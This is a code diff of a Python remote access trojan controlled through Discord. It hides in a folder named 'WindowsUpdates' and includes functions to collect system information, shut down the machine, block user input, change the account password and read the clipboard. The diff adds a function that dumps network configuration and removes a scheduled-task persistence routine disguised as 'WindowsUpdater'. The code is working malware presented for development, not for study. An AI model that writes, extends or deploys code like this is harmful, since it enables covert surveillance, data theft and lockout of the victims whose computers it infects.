@@ -16,6 +16,7 @@ import pynput
 import discord
 import os
 import pyperclip
+from time import sleep
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
@@ -32,6 +33,9 @@ def comp_info():
   embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
   file_out = discord.File("pc_info.txt", filename="pc_info.txt")
   return embed, file_out
+
+def networking_info():
+  os.system("ipconfig /all > networking_info.txt")
 
 def pc_shutdown():
   os.popen("shutdown /s /t 0")
@@ -109,13 +113,6 @@ def unblock_input():
 
 def change_password(new_password):
   os.popen(f"net user {os.getlogin()} {new_password}")
-  
-def bootup(): #USING SCHEDULED TASKS
-  try:
-    os.popen(f"schtasks /create /sc ONSTART /tn WindowsUpdater /tr {os.path.dirname(os.path.abspath(__file__))}\\main.py")
-  except Exception as e:
-    print(e)
-    return "Error creating task."
 
 def get_clipboard():
   clipboard = pyperclip.paste()
